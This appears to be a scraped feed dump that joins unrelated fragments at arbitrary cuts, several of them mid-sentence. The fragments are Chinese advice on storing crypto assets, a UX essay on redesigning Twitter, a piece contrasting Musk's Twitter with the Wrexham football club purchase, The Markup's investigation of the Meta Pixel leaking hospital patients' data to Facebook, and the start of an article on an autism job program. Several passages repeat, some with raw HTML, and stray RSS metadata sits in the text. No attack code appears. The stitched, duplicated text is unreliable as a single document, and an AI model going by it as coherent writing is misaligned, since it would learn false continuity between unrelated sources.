Grayscale（灰度 ）所发行的 GBTC 和 ETHE。另外，还有一些小的交易平台资不抵债的传闻。\n所以，在高回报高风险的加密市场，作为普通加密参与者，通过这次事件，我们已经清晰的看到头部加密资产巨头也会在很短的事件轰然倒塌，给市场参与者带来巨大损失。\n因此，康波建议：日常交易，一定不要在小的或不知名的交易平台交易加密资产，尽量使用头部交易平台，同时，鸡蛋不要放在一个篮子，头部中心化交易平台也不要放太多资产，较大规模的资产尽量还是放在链上钱包或硬件钱包，且一定离线保存好私钥，多备几份保存，实在不行，就把私钥刻在金属板上，锁在保险柜里。\nIf

They’re called (*sighs deeply*) bold & italic.\nTweet composer with simple text styling (source: Maximillian Piras)\nText styling is actually absent across all social media & Twitter may have set the precedent. Somewhere in the transition from blogging to microblogging, these controls went missing. It may have been an effort for SMS interoperability, but backwards compatibility is easily solved by using un-styled versions as a fallback. It seems like an asymmetrical change, the ones that are low risk but have potential for high reward. These opportunities are usually no brainers. Especially with validation in the form of third-party websites popping up to serve your users’ needs.\nThat said, I know what you’re thinking… that feature is underwhelming. Let’s leave on a higher note, throw some AI at the problem — the tweets write themselves!\nTweet composer with AI assistance (source: Maximillian Piras)\nUse a Large Language Model like GPT-3 to combat writer’s block & analyze Twitter’s proprietary data so the copy is optimized for trending topics. Isn’t this what we all really want: less work, more reach! What could go wrong by making it even easier to Tweet without thinking…\nLast word on the bird\nThese explorations are just for fun & probably unrealistic, but I wanted to share them as a reminder to stay open-minded & optimistic. I hope it doesn’t take a breaking point for you to challenge the core assumptions in your app’s user experience. Even a change that seems strange as first can evolve into the killer feature that keeps you out of Twitter-level turmoil.\nI also hope this article underscores the massive potential many of us feel Twitter still has. If you know anyone working there who may find these ideas interesting, feel free to share. I’m happy if they’re helpful in any capacity because I’m rooting for the phoenix to rise.\nI haven’t left for Mastodon yet, so let’s connect on the bird app.\n\nRedesigning a breaking Twitter was originally published in UX Collective on Medium, where people are continuing the conversation by highlighting and responding to this story.","dc:creator":"Maximillian Piras","guid":"https://medium.com/p/4521b258e5aa","categories":["product-design","ux","artificial-intelligence","twitter","user-experience"],"isoDate":"2022-12-15T08:57:27.000Z","from":"https://uxdesign.cc/feed","hashId":"446bb2717cfe4a10d9503e5cc2915ae1"},{"creator":"Chris Kernaghan","title":"Stop using user personas, and start talking to people","link":"https://uxdesign.cc/stop-using-user-personas-and-start-talking-to-people-ba996f1a6a2?source=rss----138adf9c44c---4","pubDate":"Thu, 15 Dec 2022 08:59:44 GMT","content:encoded":"<h4>User personas are the reason some don’t take UX design seriously</h4><figure><img alt=\"A number of different people from different backgrounds look down at their smartphones\" src=\"https://cdn-images-1.medium.com/max/1024/0*Q5VKWn_6nI8_k6vn\" /><figcaption>Source: <a href=\"https://www.pexels.com/photo/photo-of-people-engaged-on-their-phones-8088495/\">Cottonbro / Pexels</a></figcaption></figure><p>User personas have always been a controversial concept within the UX community.

Many of us in the Twitter community are horrified. As long time users we feel betrayed by the way Musk has approached his purchase. His firing of the staff, his reinstatement of awful people on the platform, and his very public bungling of the blue checkmark (among others) has left us reeling. Advertisers, his primary source of revenue, <a href=\"https://www.npr.org/2022/11/25/1139180002/twitter-loses-50-top-advertisers-elon-musk\">have left in droves</a>. Many people have written about Musk’s approach here, and at least one article likened it to a bull in a china shop. I won’t be going into too much depth on Musk here, a simple Google search will reveal numerous articles. <br> <br>In sharp contrast to Musk’s “move fast and break things” approach is the purchase of the Wrexham football club by Ryan Reynolds and Rob McElhenney. I just binged the show and although I knew that they’d bought the team, I was unaware of the details. Here’s a trailer for <a href=\"https://www.google.com/search?q=welcome+to+wrexham+trailer&amp;oq=welcome+to+wrexham+trailer&amp;aqs=chrome..69i57j0i512l3j0i22i30.12581j1j7&amp;sourceid=chrome&amp;ie=UTF-8#fpstate=ive&amp;vld=cid:6877bdfb,vid:Tv9tMSjdVac\">Welcome to Wrexham</a> but in summary Ryan and Rob made a documentary of their purchase and first season owning the club. They spend a good deal of time talking about why they did it, episodes highlight the lives of the people in or involved with the team, and they provide some history of the Welsh town of Wrexham, engaging the viewer with the story of the purchase in the context of the town and Wales itself.</p><p>Unlike Twitter, Rob and Ryan were very aware of how their purchase of the club would affect the Wrexham community and they were transparent about how they might be received, especially early in the documentary. They engaged the people of Wrexham and understood how the effect they were having. This was expressed as they clearly took the time to get to know folks in the town and include them in the story they were telling on the show. Part of this story was promotion… moving Wrexham up and out of their current level in the National League.</p><p>It was clear that they needed to spend money to achieve this goal and for a depressed community like Wrexham, this was going to be significant and time-consuming.</p><blockquote>Always design a thing by considering it in its next larger context — a chair in a room, a room in a house, a house in an environment, an environment in a city plan. — Eliel Saarinen</blockquote><p>As a designer, I always look at things through the lens of design and the above quote is pertinent as it suggests that Rob and Ryan were after a more substantive approach to their new team.</p><p>The Wrexham stadium (The Racehorse Ground) would have be updated and remodeled. They started with the pitch and worked <a href=\"https://www.thestadiumbusiness.com/2022/06/16/wrexham-reveals-designs-for-new-kop-stand/\">their way into the stands</a>. Along the way they met with the people of the town, including them as part of the documentary. They point out the low wages of the team members at this league level and the players’ efforts to keep up their houses and families. Rob and Ryan introduce viewers to team members, townspeople, business owners, and themselves as part of the show but take it several steps further. Episode seven in season 1 is called the Wide World of Wales. This episode kindly parodies the ABC Television Wide World of Sports and acts as a kind of commercial for tourism to Wales!

Many of us in the Twitter community are horrified. As long time users we feel betrayed by the way Musk has approached his purchase. His firing of the staff, his reinstatement of awful people on the platform, and his very public bungling of the blue checkmark (among others) has left us reeling. Advertisers, his primary source of revenue, have left in droves. Many people have written about Musk’s approach here, and at least one article likened it to a bull in a china shop. I won’t be going into too much depth on Musk here, a simple Google search will reveal numerous articles. \n In sharp contrast to Musk’s “move fast and break things” approach is the purchase of the Wrexham football club by Ryan Reynolds and Rob McElhenney. I just binged the show and although I knew that they’d bought the team, I was unaware of the details. Here’s a trailer for Welcome to Wrexham but in summary Ryan and Rob made a documentary of their purchase and first season owning the club. They spend a good deal of time talking about why they did it, episodes highlight the lives of the people in or involved with the team, and they provide some history of the Welsh town of Wrexham, engaging the viewer with the story of the purchase in the context of the town and Wales itself.\nUnlike Twitter, Rob and Ryan were very aware of how their purchase of the club would affect the Wrexham community and they were transparent about how they might be received, especially early in the documentary. They engaged the people of Wrexham and understood how the effect they were having. This was expressed as they clearly took the time to get to know folks in the town and include them in the story they were telling on the show. Part of this story was promotion… moving Wrexham up and out of their current level in the National League.\nIt was clear that they needed to spend money to achieve this goal and for a depressed community like Wrexham, this was going to be significant and time-consuming.\nAlways design a thing by considering it in its next larger context — a chair in a room, a room in a house, a house in an environment, an environment in a city plan. — Eliel Saarinen\nAs a designer, I always look at things through the lens of design and the above quote is pertinent as it suggests that Rob and Ryan were after a more substantive approach to their new team.\nThe Wrexham stadium (The Racehorse Ground) would have be updated and remodeled. They started with the pitch and worked their way into the stands. Along the way they met with the people of the town, including them as part of the documentary. They point out the low wages of the team members at this league level and the players’ efforts to keep up their houses and families. Rob and Ryan introduce viewers to team members, townspeople, business owners, and themselves as part of the show but take it several steps further. Episode seven in season 1 is called the Wide World of Wales. This episode kindly parodies the ABC Television Wide World of Sports and acts as a kind of commercial for tourism to Wales! In addition to learning to cook a traditional Welsh dish and learning some of the language, they had Charlotte Church sing the Welsh anthem. She’s a Welsh singing legend.\n\nRob and Ryan also knew they would have to address the needs of the team and that meant some hard decisions about the staff. As they got to know these people and make staff decisions, they treated these changes with as much grace as can be achieved in these situations. There’s an episode where they sit down with some folks in the local pub and as they drink shots, one person offers a harsh criticism of the former business manager of the team who was replaced. As Rob and Ryan had gotten to know the man and seemingly disagree with his assessment, Ryan comes back with a quick quip to diffuse the comment.

Just because he was no longer with the team, didn’t mean he wasn’t still a fan and part of the community. Musk fired people who had the audacity to criticize him on Twitter and Slack.\nPromotion out of the National League would also take time. The first set of matches from their first full season as owners didn’t go well. There was a\nlot of discomfort and a level of anger apparent among the people of the town in a couple of the episodes. There are questions for the new owners. But Rob and Ryan are careful to address the elephant in the room. They even take an episode to talk about hooliganism. It’s an awful part of the sport made worse when a team isn’t winning. With the economy of the town depressed, Wrexham has its share of hooliganism.

On 33 of them we found the tracker, called the Meta Pixel, sending Facebook a packet of data whenever a person clicked a button to schedule a doctor’s appointment.</p>\n<p>\\\nThe data is connected to an IP address—an identifier that’s like a computer’s mailing address and can generally be linked to a specific individual or household—creating an intimate receipt of the appointment request for Facebook.</p>\n<p>\\\nOn the website of University Hospitals Cleveland Medical Center, for example, clicking the “Schedule Online” button on a doctor’s page prompted the Meta Pixel to send Facebook the text of the button, the doctor’s name, and the search term we used to find her: “pregnancy termination.”</p>\n<p>\\\nClicking the “Schedule Online Now” button for a doctor on the website of Froedtert Hospital, in Wisconsin, prompted the Meta Pixel to send Facebook the text of the button, the doctor’s name, and the condition we selected from a dropdown menu: “Alzheimer’s.”</p>\n<p>\\\nThe Markup also found the Meta Pixel installed inside the password-protected patient portals of seven health systems.</p>\n<p>\\\nOn five of those systems’ pages, we documented the pixel sending Facebook data about real patients who volunteered to participate in the Pixel Hunt project, a collaboration between The Markup and Mozilla Rally.</p>\n<p>\\\nThe project is a <a href=\"https://rally.mozilla.org/current-studies/facebook-pixel-hunt/index.html?utm_source=markupweb\">crowd-sourced undertaking</a> in which anyone can install <a href=\"https://rally.mozilla.org/about-rally/?utm_source=markupweb\">Mozilla’s Rally browser add-on</a> in order to send The Markup data on the Meta Pixel as it appears on sites that they visit.</p>\n<p>\\\nThe data sent to hospitals included the names of patients’ medications, descriptions of their allergic reactions, and details about their upcoming doctor’s appointments.</p>\n<p>\\\n <img src=\"https://cdn.hackernoon.com/images/HgNYtFi17WbGLaRvGCmxhdy7K5L2-ina2hic.jpeg\" alt=\"\" /></p>\n<p>\\\nFormer regulators, health data security experts, and privacy advocates who reviewed The Markup’s findings said the hospitals in question may have violated the federal Health Insurance Portability and Accountability Act (HIPAA).</p>\n<p>\\\nThe law prohibits covered entities like hospitals from sharing personally identifiable health information with <a href=\"https://www.hhs.gov/hipaa/for-professionals/privacy/guidance/marketing/index.html\">third parties like Facebook</a>, except when an individual has expressly consented in advance or under certain contracts.</p>\n<p>\\\nNeither the hospitals nor Meta said they had such contracts in place, and The Markup found no evidence that the hospitals or Meta were otherwise obtaining patients’ express consent.</p>\n<p>\\\n“I am deeply troubled by what [the hospitals] are doing with the capture of their data and the sharing of it,” said David Holtzman, a health privacy consultant who previously served as a senior privacy adviser in the U.S. Department of Health and Human Services’ Office for Civil Rights, which enforces HIPAA.</p>\n<p>\\\n“I cannot say [sharing this data] is for certain a HIPAA violation. It is quite likely a HIPAA violation.”</p>\n<p>\\\nUniversity Hospitals Cleveland Medical Center spokesperson George Stamatis did not respond to The Markup’s questions but said in a brief statement that the hospital “comport[s] with all applicable federal and state laws and regulatory requirements.”</p>\n<p>\\\nAfter reviewing The Markup’s findings, Froedtert Hospital removed the Meta Pixel from its website “out of an abundance of caution,” Steve Schooff, a spokesperson for the hospital, wrote in a statement.</p>\n<p>\\\nAs of June 15, six other hospitals had also removed pixels from their appointment booking pages and at least five of the seven health systems that had Meta Pixels installed in their patient portals had removed those pixels.</p>\n<p>\\\nThe 33 hospitals The Markup found sending patient appointment details to Facebook collectively reported more than 26&nbsp;million patient admissions and outpatient visits in 2020, according to the most <a href=\"https://guide.prod.iam.aha.org/guide/\">recent data available</a> from the American Hospital Association.</p>\n<p>\\\nOur investigation was limited to just over 100 hospitals; the data sharing likely affects many more patients and institutions than we identified.</p>\n<p>\\\nFacebook itself is not subject to HIPAA, but the experts interviewed for this story expressed concerns about how the advertising giant might use the personal health data it’s collecting for its own profit.</p>\n<p>\\\n“This is an extreme example of exactly how far the tentacles of Big Tech reach into what we think of as a protected data space,” said Nicholson Price, a University of Michigan law professor who studies big data and health care.</p>\n<p>\\\n“I think this is creepy, problematic, and potentially illegal” from the hospitals’ point of view.</p>\n<p>\\\nThe Markup was unable to determine whether Facebook used the data to target advertisements, train its recommendation algorithms, or profit in other ways.</p>\n<p>\\\nFacebook’s parent company, Meta, did not respond to questions. Instead, spokesperson Dale Hogan sent a brief email paraphrasing the company’s <a href=\"https://www.facebook.com/business/help/361948878201809?id=188852726110565\">sensitive health data policy</a>.</p>\n<p>\\\n“If Meta’s signals filtering systems detect that a business is sending potentially sensitive health data from their app or website through their use of Meta Business Tools, which in some cases can happen in error, that potentially sensitive data will be removed before it can be stored in our ads systems,” Hogan wrote.</p>\n<p>\\\nMeta did not respond to follow-up questions, but Hogan appears to be referencing a sensitive health information filtering system that the company launched in July 2020 in response to a <a href=\"https://www.wsj.com/articles/you-give-apps-sensitive-personal-information-then-they-tell-facebook-11550851636\">Wall Street Journal article</a> and New York Department of Financial Services investigation.</p>\n<p>\\\nMeta told the investigators that the filtering system was “not yet operating with complete accuracy,” according to the department’s February 2021 <a href=\"https://www.dfs.ny.gov/system/files/documents/2021/02/facebook_report_20210218.pdf\">final report</a>.</p>\n<p>\\\nThe Markup was unable to confirm whether any of the data referenced in this story was in fact removed before being stored by Meta.</p>\n<p>\\\nHowever, a recent <a href=\"https://themarkup.org/pixel-hunt/2022/06/15/facebook-and-anti-abortion-clinics-are-collecting-highly-sensitive-info-on-would-be-patients\">joint investigation with Reveal</a> found that Meta’s sensitive health information filtering system didn’t block information about appointments a reporter requested with crisis pregnancy centers.</p>\n<p>\\\nInternally, Facebook employees have been blunt about how well—or not so well—the company generally protects sensitive data.</p>\n<p>\\\n“We do not have an adequate level of control and explainability over how our systems use data, and thus we can’t confidently make controlled policy changes or external commitments such as ‘we will not use X data for Y purpose.’ ” Facebook engineers on the ad and business product team wrote in a 2021 privacy overview that was <a href=\"https://www.vice.com/en/article/akvmke/facebook-doesnt-know-what-it-does-with-your-data-or-where-it-goes\">leaked to Vice</a>.</p>\n<h2 id=\"almostanypatientwouldbenbspshocked\"><strong>“Almost Any Patient Would Be&nbsp;Shocked”</strong></h2>\n<p>The Meta Pixel is a snippet of code that tracks users as they navigate through a website, logging which pages they visit, which buttons they click, and certain information they enter into forms. </p>\n<p>\\\nIt’s one of the most prolific tracking tools on the internet—present on more than 30&nbsp;percent of the most popular sites on the web, according to The Markup’s <a href=\"https://themarkup.org/blacklight/2020/09/22/blacklight-tracking-advertisers-digital-privacy-sensitive-websites\">analysis</a>.</p>\n<p>\\\nIn exchange for installing its pixel, Meta provides website owners analytics about the ads they’ve placed on Facebook and Instagram and tools to target people who’ve visited their website.</p>\n<p>\\\nThe Meta Pixel sends information to Facebook via scripts running in a person’s internet browser, so each data packet comes labeled with an IP address that can be used in combination with other data to <a href=\"https://us.norton.com/internetsecurity-privacy-what-does-an-ip-address-tell-you.html\">identify an individual or household</a>.</p>\n<p>\\\nHIPAA lists IP addresses as one of the <a href=\"https://www.luc.edu/its/aboutits/itspoliciesguidelines/hipaainformation/18hipaaidentifiers/\">18 identifiers</a> that, when linked to information about a person’s health conditions, care, or payment, can qualify the data as protected health information.</p>\n<p>\\\nUnlike anonymized or aggregate health data, hospitals can’t share protected health information with third parties except under the strict terms of business associate agreements that restrict how the data can be used.</p>\n<p>\\\nIn addition, if a patient is logged in to Facebook when they visit a hospital’s website where a Meta Pixel is installed, some browsers will attach third-party cookies—another tracking mechanism—that allow Meta to link pixel data to specific Facebook accounts.</p>\n<p>\\\nAnd in several cases we found—using both dummy accounts created by our reporters and data from Mozilla Rally volunteers—that the Meta Pixel made it even easier to identify patients.</p>\n<p>\\\nWhen The Markup clicked the “Finish Booking” button on a Scripps Memorial Hospital doctor’s page, the pixel sent Facebook not just the name of the doctor and her field of medicine but also the first name, last name, email address, phone number, zip code, and city of residence we entered into the booking form.</p>\n<p>\\\nThe Meta Pixel “hashed” those personal details—obscuring them through a form of cryptography—before sending them to Facebook. </p>\n<p>\\\nBut that hashing doesn’t prevent Facebook from using the data.

On 33 of them we found the tracker, called the Meta Pixel, sending Facebook a packet of data whenever a person clicked a button to schedule a doctor’s appointment.\n\\\nThe data is connected to an IP address—an identifier that’s like a computer’s mailing address and can generally be linked to a specific individual or household—creating an intimate receipt of the appointment request for Facebook.\n\\\nOn the website of University Hospitals Cleveland Medical Center, for example, clicking the “Schedule Online” button on a doctor’s page prompted the Meta Pixel to send Facebook the text of the button, the doctor’s name, and the search term we used to find her: “pregnancy termination.”\n\\\nClicking the “Schedule Online Now” button for a doctor on the website of Froedtert Hospital, in Wisconsin, prompted the Meta Pixel to send Facebook the text of the button, the doctor’s name, and the condition we selected from a dropdown menu: “Alzheimer’s.”\n\\\nThe Markup also found the Meta Pixel installed inside the password-protected patient portals of seven health systems.\n\\\nOn five of those systems’ pages, we documented the pixel sending Facebook data about real patients who volunteered to participate in the Pixel Hunt project, a collaboration between The Markup and Mozilla Rally.\n\\\nThe project is a crowd-sourced undertaking in which anyone can install Mozilla’s Rally browser add-on in order to send The Markup data on the Meta Pixel as it appears on sites that they visit.\n\\\nThe data sent to hospitals included the names of patients’ medications, descriptions of their allergic reactions, and details about their upcoming doctor’s appointments.\n\\\n \n\\\nFormer regulators, health data security experts, and privacy advocates who reviewed The Markup’s findings said the hospitals in question may have violated the federal Health Insurance Portability and Accountability Act (HIPAA).\n\\\nThe law prohibits covered entities like hospitals from sharing personally identifiable health information with third parties like Facebook, except when an individual has expressly consented in advance or under certain contracts.\n\\\nNeither the hospitals nor Meta said they had such contracts in place, and The Markup found no evidence that the hospitals or Meta were otherwise obtaining patients’ express consent.\n\\\n“I am deeply troubled by what [the hospitals] are doing with the capture of their data and the sharing of it,” said David Holtzman, a health privacy consultant who previously served as a senior privacy adviser in the U.S. Department of Health and Human Services’ Office for Civil Rights, which enforces HIPAA.\n\\\n“I cannot say [sharing this data] is for certain a HIPAA violation. It is quite likely a HIPAA violation.”\n\\\nUniversity Hospitals Cleveland Medical Center spokesperson George Stamatis did not respond to The Markup’s questions but said in a brief statement that the hospital “comport[s] with all applicable federal and state laws and regulatory requirements.”\n\\\nAfter reviewing The Markup’s findings, Froedtert Hospital removed the Meta Pixel from its website “out of an abundance of caution,” Steve Schooff, a spokesperson for the hospital, wrote in a statement.\n\\\nAs of June 15, six other hospitals had also removed pixels from their appointment booking pages and at least five of the seven health systems that had Meta Pixels installed in their patient portals had removed those pixels.\n\\\nThe 33 hospitals The Markup found sending patient appointment details to Facebook collectively reported more than 26 million patient admissions and outpatient visits in 2020, according to the most recent data available from the American Hospital Association.\n\\\nOur investigation was limited to just over 100 hospitals; the data sharing likely affects many more patients and institutions than we identified.\n\\\nFacebook itself is not subject to HIPAA, but the experts interviewed for this story expressed concerns about how the advertising giant might use the personal health data it’s collecting for its own profit.\n\\\n“This is an extreme example of exactly how far the tentacles of Big Tech reach into what we think of as a protected data space,” said Nicholson Price, a University of Michigan law professor who studies big data and health care.\n\\\n“I think this is creepy, problematic, and potentially illegal” from the hospitals’ point of view.\n\\\nThe Markup was unable to determine whether Facebook used the data to target advertisements, train its recommendation algorithms, or profit in other ways.\n\\\nFacebook’s parent company, Meta, did not respond to questions. Instead, spokesperson Dale Hogan sent a brief email paraphrasing the company’s sensitive health data policy.\n\\\n“If Meta’s signals filtering systems detect that a business is sending potentially sensitive health data from their app or website through their use of Meta Business Tools, which in some cases can happen in error, that potentially sensitive data will be removed before it can be stored in our ads systems,” Hogan wrote.\n\\\nMeta did not respond to follow-up questions, but Hogan appears to be referencing a sensitive health information filtering system that the company launched in July 2020 in response to a Wall Street Journal article and New York Department of Financial Services investigation.\n\\\nMeta told the investigators that the filtering system was “not yet operating with complete accuracy,” according to the department’s February 2021 final report.\n\\\nThe Markup was unable to confirm whether any of the data referenced in this story was in fact removed before being stored by Meta.\n\\\nHowever, a recent joint investigation with Reveal found that Meta’s sensitive health information filtering system didn’t block information about appointments a reporter requested with crisis pregnancy centers.\n\\\nInternally, Facebook employees have been blunt about how well—or not so well—the company generally protects sensitive data.\n\\\n“We do not have an adequate level of control and explainability over how our systems use data, and thus we can’t confidently make controlled policy changes or external commitments such as ‘we will not use X data for Y purpose.’ ” Facebook engineers on the ad and business product team wrote in a 2021 privacy overview that was leaked to Vice.\n“Almost Any Patient Would Be Shocked”\nThe Meta Pixel is a snippet of code that tracks users as they navigate through a website, logging which pages they visit, which buttons they click, and certain information they enter into forms. \n\\\nIt’s one of the most prolific tracking tools on the internet—present on more than 30 percent of the most popular sites on the web, according to The Markup’s analysis.\n\\\nIn exchange for installing its pixel, Meta provides website owners analytics about the ads they’ve placed on Facebook and Instagram and tools to target people who’ve visited their website.\n\\\nThe Meta Pixel sends information to Facebook via scripts running in a person’s internet browser, so each data packet comes labeled with an IP address that can be used in combination with other data to identify an individual or household.\n\\\nHIPAA lists IP addresses as one of the 18 identifiers that, when linked to information about a person’s health conditions, care, or payment, can qualify the data as protected health information.\n\\\nUnlike anonymized or aggregate health data, hospitals can’t share protected health information with third parties except under the strict terms of business associate agreements that restrict how the data can be used.\n\\\nIn addition, if a patient is logged in to Facebook when they visit a hospital’s website where a Meta Pixel is installed, some browsers will attach third-party cookies—another tracking mechanism—that allow Meta to link pixel data to specific Facebook accounts.\n\\\nAnd in several cases we found—using both dummy accounts created by our reporters and data from Mozilla Rally volunteers—that the Meta Pixel made it even easier to identify patients.\n\\\nWhen The Markup clicked the “Finish Booking” button on a Scripps Memorial Hospital doctor’s page, the pixel sent Facebook not just the name of the doctor and her field of medicine but also the first name, last name, email address, phone number, zip code, and city of residence we entered into the booking form.\n\\\nThe Meta Pixel “hashed” those personal details—obscuring them through a form of cryptography—before sending them to Facebook. \n\\\nBut that hashing doesn’t prevent Facebook from using the data. In fact, Meta explicitly uses the hashed information to link pixel data to Facebook profiles.\n\\\nUsing a free online tool, The Markup was also able to reverse most of our hashed test information that the pixel on Scripps Memorial Hospital’s website sent to Facebook.\n\\\nScripps Memorial didn’t respond to The Markup’s questions but it did remove the Meta Pixel from the final webpages in the appointment booking process after we shared our findings with the hospital.\n\\\nOn other hospitals’ websites, we documented the Meta Pixel collecting similarly intimate information about real patients.\n\\\nWhen one real patient who participated in the Pixel Hunt study logged in to the MyChart portal for Piedmont Healthcare, a Georgia health system, the Meta Pixel installed in the portal told Facebook the patient’s name, the name of their doctor, and the time of their upcoming appointment, according to data collected by the participant’s Mozilla Rally browser extension.\nThe Meta Pixel collects sensitive health information and shares it with Facebook\nThe Meta Pixel installed on Piedmont Healthcare’s MyChart portal sent Facebook details about a real patient's upcoming doctor's appointment, including date, time, the patient’s name, and the name of their doctor\n1Patient name\n2Date and time of appointment\n3Name of provider\n\\\n \n\\\nWhen another Pixel Hunt participant used the MyChart portal for Novant Health, a North Carolina–based health system, the pixel told Facebook the type of allergic reaction the patient had to a specific medication.\n\\\nThe Markup created our own MyChart account through Novant Health to further investigate and found the Meta Pixel collecting a variety of other sensitive information.\n\\\nClicking on one button prompted the pixel to tell Facebook the name and dosage of a medication in our health record, as well as any notes we had entered about the prescription.

Mass General did not respond to The Markup’s request for comment.\n\\\nAs with all such data we found the Meta Pixel collecting, it was sent to Facebook along with our computer’s public IP address.\n\\\n“When an individual has sought out a provider and indicated that they want to make an appointment, at that point, any individually identifiable health information that they’ve provided in this session, in the past, or certainly in the future, is protected under HIPAA and could not be shared with a third party like Facebook,” Holtzman said.\n\\\nThe U.S. Department of Human Services’ Office for Civil Rights “cannot comment on open or potential investigations,” spokesperson Rachel Seeger wrote in an emailed statement.\n\\\n“Generally, HIPAA covered entities and business associates should not be sharing identifiable information with social media companies unless they have HIPAA authorization [from the individual] and consent under state law,” said Iliana Peters, a privacy lawyer with the firm Polsinelli who previously headed HIPAA enforcement for the Office for Civil Rights.\n\\\nPatients have the right to file HIPAA complaints with their medical providers, who are required to investigate the complaints, Peters said, adding, “I would hope that institutions would respond quickly to those types of complaints so that they aren’t escalated to a state or federal regulator.”\n\"Plausible Deniability\"\nMost of the hospitals The Markup contacted for this story did not respond to our questions or explain why they chose to install Meta Pixel on their websites.

He rarely left his parents’ duplex and filled his time studying daily newspapers, convinced they contained secret messages. </p>\n<p>\\\nSometimes, he worked up the energy to paint miniature figurines from the medieval fantasy-themed board game Warhammer. Mostly, he did nothing.</p>\n<p>\\\nThe psychotic episode and the autism diagnosis locked him into a state of isolation that had been deepening since his childhood, solidifying his long-held belief that he was an outsider. Van Ruitenbeek’s parents took him to appointments with doctors and therapists. </p>\n<p>\\\nWhen he grew strong enough, they supported his return to work. He did simple tasks — mostly cutting and packaging yarn — at a job he obtained through the local mental health department. </p>\n<p>\\\nThat was a far cry from his earlier aspirations of being a video game designer and hardly the life his parents had hoped he would have. They worried about what would happen when they grew old and could no longer look after him.</p>\n<p>\\\nThen, during a meeting with his coach at the mental health department in 2013, van Ruitenbeek and his parents got an unexpected bit of hope. </p>\n<p>\\\nA short distance away, a first-time entrepreneur named Peter van Hofweegen and his business partner were figuring out how to launch an education and job placement program geared toward autistic young adults who were interested in computers.</p>\n<p>\\\nThe number of people diagnosed with autism is hard to ascertain, but the statistics that are available suggest it’s on the rise. </p>\n<p>\\\nAn estimated 100,000 autistic Americans turn 18 every year, according to <a href=\"https://drexel.edu/autismoutcomes/topics/employment/\">Drexel University’s Autism Institute</a>, and a growing number of programs in the U.S. and elsewhere aim to employ tech-savvy autistic people.</p>\n<p>\\\nBut van Hofweegen’s program was something different. He and his partner sought primarily to recruit socially isolated, seemingly unemployable dropouts who almost certainly would be passed over even by employers who welcome candidates with neurological differences like autism. </p>\n<p>\\\nThey wanted people who couldn’t make it on their own and had been “sitting for years in their parents’ homes,” van Hofweegen said. The number of students in his program would be small, but the stakes were large. </p>\n<p>\\\nIf they could be doing meaningful, sophisticated work, what kind of a model might that provide for the uncounted numbers of people with autism around the world seemingly sentenced to constricted, unproductive lives.</p>\n<p>\\\nThe untested model drew skepticism even from other autism advocates, who viewed it as well-intentioned but overly idealistic. But van Ruitenbeek’s coach, Anita de Winter, saw it as a godsend. </p>\n<p>\\\nShe had worked with hundreds of autistic adults who struggled to find meaningful work and become independent. De Winter described the program to van Ruitenbeek without betraying her enthusiasm. She didn’t want him to be disappointed if it didn’t work out.</p>\n<p>\\\n“This might be for someone like you,” she told him.</p>\n<p>\\\nVan Hofweegen’s path to autism advocacy traces back to 1996, when his first child was born. The boy, named Thijs, sustained an injury during birth and was diagnosed with cerebral palsy. </p>\n<p>\\\nDoctors told van Hofweegen and his then-wife that Thijs might never walk or talk. But with the help of specialists, he learned to both move and speak.</p>\n<p>\\\nThijs went far beyond that. After proclaiming a desire to learn how to swim at age 5, and taking seven years to pass his basic swimming test, Thijs persisted through intermediate and advanced levels alongside much younger classmates. </p>\n<p>\\\nWhen he swam the 50-meter freestyle test to pass the advanced level, he earned a standing ovation from the other students’ parents. Van Hofweegen never forgot that moment. (He continued to ponder it even as Thijs developed into a competitive swimmer and won a silver medal in the men’s 400-meter freestyle at the Paralympic Games in 2016.) </p>\n<p>\\\nIt showed what a person could accomplish with the right support and accommodations.</p>\n<p>\\\nWhile helping out at an event in 2012 for people struggling with unemployment, van Hofweegen met Frans de Bie, an IT guru and fellow volunteer. A year earlier, de Bie had sold his 40-person tech company. Like van Hofweegen, de Bie drew inspiration from his personal life. </p>\n<p>\\\nHe had grown up alongside foster siblings, and he understood the transformative power of a supportive environment. He also was motivated by his son and daughter, who have dyslexia.</p>\n<p>\\\nThe new friends hit upon an idea. Van Hofweegen had read a survey saying 20,000 Dutch people were not participating in the workforce because of their autism. Perhaps they could start an organization that would help autistic people interested in technology to find work. </p>\n<p>\\\nAfter more than 25 years in management roles at hotels and at a temporary-job placement agency, van Hofweegen quit his job. A short time later, in late 2013, he and de Bie incorporated an organization they called ITvitae.</p>\n<p>\\\nThe Dutch have a saying: “God created the earth, but the Dutch created the Netherlands.” That’s because for centuries, the country’s citizens reclaimed land from the North Sea using their iconic system of dikes, canals and windmills. </p>\n<p>\\\nAbout a third of the country’s fertile land is below sea level. The Netherlands, half the size of South Carolina, remains among the world’s leading economies in part because its people have maximized its geographical resources.</p>\n<p>\\\nAnd so it was culturally ingrained in van Hofweegen and de Bie to maximize the country’s human resources. Partly because de Bie was familiar with the unmet demand for IT jobs in the Netherlands, a <a href=\"https://www.computable.nl/artikel/nieuws/carriere/7233117/250449/aantal-vacatures-in-ict-branche-stijgt-flink.html\">gap currently estimated at 100,000</a>, and because the country has a robust tech sector, the co-founders wanted to focus on that area.</p>\n<p>\\\nThe two men saw ITvitae — the name is an amalgam of “information technology” and “curriculum vitae,” which they pronounce ee-tay-vee-tay — as a way to fill tech-sector jobs and strengthen the Dutch economy as much as they considered it a social enterprise to lift up autistic people who felt excluded from the job market.</p>\n<p>\\\nCommon traits found in autistic people often prevent them from being hired or even applying to jobs in the first place. They may struggle to interpret social cues, pause frequently when speaking, exhibit disruptive eccentricities or avoid eye contact. </p>\n<p>\\\nYet employers have found that other <a href=\"https://www.autismspeaks.org/job-seekers-students-employees\">characteristics</a> make them excellent employees. They tend to be thorough and fastidious, have the ability to go deep on specific topics and focus for prolonged periods of time. </p>\n<p>\\\nThose traits lend themselves to careers in technology and cybersecurity, among many other fields.</p>\n<p>\\\nVan Hofweegen and de Bie envisioned a six-month course focused on preparing students to be software testers — a natural fit for autistic people, who tend to be methodical rule-followers. </p>\n<p>\\\nAs the students embarked on coursework, van Hofweegen would find employers by cold-calling IT and software companies as well as by tapping the connections of his board members.</p>\n<p>\\\nThe co-founders believed ITvitae could generate revenue primarily by charging employers a recruiting fee for each hire. </p>\n<p>\\\nDe Bie believed employers would be willing to pay because the amount he proposed was less than the typical cost of specialized, third-party technical training for new or existing employees.</p>\n<p>\\\nThe first challenge was finding students. After winding their way through various government agencies, van Hofweegen and de Bie found de Winter, who worked near where they lived. </p>\n<p>\\\n“Do you know these types of people?” van Hofweegen asked her in 2013 after laying out the vision for ITvitae. She replied, “How many do you want?”</p>\n<p>\\\nAs the co-founders prepared to interview about 30 